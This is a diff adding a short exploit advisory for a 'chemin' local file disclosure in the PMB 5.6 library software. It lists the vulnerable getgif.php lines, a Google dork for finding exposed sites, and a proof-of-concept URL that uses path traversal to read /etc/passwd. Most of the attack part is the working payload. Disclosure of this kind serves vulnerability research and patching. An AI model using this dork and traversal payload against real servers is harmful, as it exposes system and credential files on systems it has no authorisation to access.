@@ -1,0 +1,23 @@
+# Exploit Title: PMB 5.6 - 'chemin' Local File Disclosure
+# Date: 2020-10-13
+# Google Dork: inurl:opac_css
+# Exploit Author: 41-trk (Tarik Bakir)
+# Vendor Homepage: http://www.sigb.net
+# Software Link: http://forge.sigb.net/redmine/projects/pmb/files
+# Affected versions : <= 5.6 
+# Tested on: Ubuntu 18.04.1
+
+The PMB Gif Image is not sanitizing the 'chemin',
+which leads to Local File Disclosure.
+
+As of today (2020-10-13) this issue is unfixed.
+
+Vulnerable code: (getgif.php )
+
+line 55    $fp2=@fopen($chemin, "rb");
+line 68    fpassthru($fp)
+
+
+========================= Proof-of-Concept ===================================================
+
+    http://127.0.0.1:2121/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
